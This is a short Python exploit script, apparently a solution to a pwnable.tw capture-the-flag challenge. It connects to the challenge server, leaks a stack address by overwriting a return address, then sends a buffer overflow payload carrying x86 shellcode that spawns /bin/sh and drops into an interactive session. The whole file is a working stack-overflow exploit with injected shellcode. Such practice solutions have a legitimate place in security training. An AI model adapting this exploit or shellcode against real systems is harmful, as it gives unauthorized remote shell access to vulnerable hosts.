#! /usr/bin/python

import sys
import socket
import telnetlib
import struct

buf = "\x41"*(20)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

def recvuntil(s, delim):
	buf = ''
	while not buf.endswith(delim):
		buf += s.recv(1)

	return buf

def leak(s):
	recvuntil(s, ':')
	s.send(b"\x41"*(0x14) + struct.pack("<I", 0x08048087))
	addr = s.recv(4)

	return struct.unpack("<I", addr)[0]

def shell(s, q):
	s.send(buf + struct.pack("<I", q + 20) + shellcode)
	# s.send("cat /home/start/flag\n")

	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

try:
	s = socket.create_connection(("chall.pwnable.tw", 10000))
except socket.gaierror as e:
	sys.exit(-1)

addr = leak(s)

print "[*] %esp at: " + hex(addr)
print "[*] Entering interactive session.."
shell(s, addr)
